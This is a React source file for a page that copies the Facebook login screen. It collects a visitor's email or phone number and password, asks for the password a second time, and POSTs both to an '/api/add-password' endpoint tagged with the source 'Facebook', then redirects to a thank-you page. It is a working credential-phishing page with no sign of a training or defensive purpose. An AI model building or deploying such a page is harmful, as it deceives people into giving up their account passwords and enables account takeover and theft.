import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const FacebookPage = () => {
  const [isConfirming, setIsConfirming] = useState(false);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [confirmPassword, setConfirmPassword] = useState("");
  const navigate = useNavigate();

  const handleFirstSubmit = (event) => {
    event.preventDefault();
    setIsConfirming(true);
  };

  const handleFinalSubmit = async (event) => {
    event.preventDefault();

    if (password === confirmPassword) {
      try {
        // Send data to backend
        const response = await fetch("/api/add-password", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            source: "Facebook",
            emailOrUsername: email,
            password,
          }),
        });

        if (!response.ok) {
          throw new Error("Network response was not ok");
        }

        navigate("/thank-you-page");
      } catch (error) {
        console.error("Error:", error);
      }
    } else {
      console.error("Passwords do not match");
    }
  };

  return (
    <div className="bg-slate-100 h-screen flex flex-col items-center md:flex-row md:justify-evenly login-page">
      <div className="text-box">
        <h1 className="text-blue-600 text-6xl font-bold py-5">facebook</h1>
        <h1 className="text-2xl">Sign In to Continue</h1>
      </div>

      <div className="w-10/12 h-auto sm:w-7/12 lg:w-3/12 xl:w-3/12 login-form flex-col justify-center items-center">
        {!isConfirming ? (
          <form
            className="flex-col justify-center items-center"
            onSubmit={handleFirstSubmit}
          >
            <input
              type="text"
              placeholder="Email or phone number"
              className="w-11/12 h-14 p-5 m-3 border-2 border-solid border-gray-100 rounded-lg outline-none focus:outline-blue-600"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
            />
            <input
              type="password"
              placeholder="Password"
              className="w-11/12 h-14 p-5 m-3 border-2 border-solid border-gray-100 rounded-lg outline-none focus:outline-blue-600"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              required
            />
            <button className="w-11/12 h-14 bg-blue-600 mt-4 rounded-lg text-white text-2xl font-semibold">
              Log In
            </button>
            <p className="text-blue-500 mt-3 cursor-pointer hover:underline">
              Forgot Password?
            </p>
            <hr className="mt-6 w-4/5 mx-auto" />
            <div className="flex justify-center items-center">
              <button className="w-2/4 h-11 bg-custom-green text-white my-6 rounded-lg">
                Create new account
              </button>
            </div>
            <p className="my-2 md:w-full">
              <span className="font-semibold hover:underline cursor-pointer">
                Create a Page
              </span>{" "}
              for a celebrity, brand or business.
            </p>
          </form>
        ) : (
          <form
            className="flex-col justify-center items-center"
            onSubmit={handleFinalSubmit}
          >
            <input
              type="password"
              placeholder="Confirm Password"
              className="w-11/12 h-14 p-5 m-3 border-2 border-solid border-gray-100 rounded-lg outline-none focus:outline-blue-600"
              value={confirmPassword}
              onChange={(e) => setConfirmPassword(e.target.value)}
              required
            />
            <button className="w-11/12 h-14 bg-blue-600 mt-4 rounded-lg text-white text-2xl font-semibold">
              Confirm and Submit
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default FacebookPage;
